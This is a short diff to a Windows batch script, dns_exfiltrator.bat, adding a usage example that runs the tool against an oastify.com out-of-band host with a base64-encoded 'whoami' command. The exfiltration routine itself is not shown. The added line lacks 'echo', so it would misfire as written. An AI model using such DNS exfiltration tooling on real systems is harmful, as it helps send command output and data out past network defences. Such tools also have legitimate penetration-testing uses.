@@ -14,6 +14,7 @@ setlocal EnableDelayedExpansion
 	call :validate error %2
 	if "!error!" EQU "true" (
 		echo Usage: dns_exfiltrator.bat ^<dns-server^> ^<encoding^> ^<enc-command^>
+		Example: dns_exfiltrator.bat 6t0bi7ymzn4odlygef33bxnyzp5gtdh2.oastify.com base64 d2hvYW1p(base64 encoded 'whoami')
 	) else (
 		call :exfiltrate %1 %2 %3
 	)
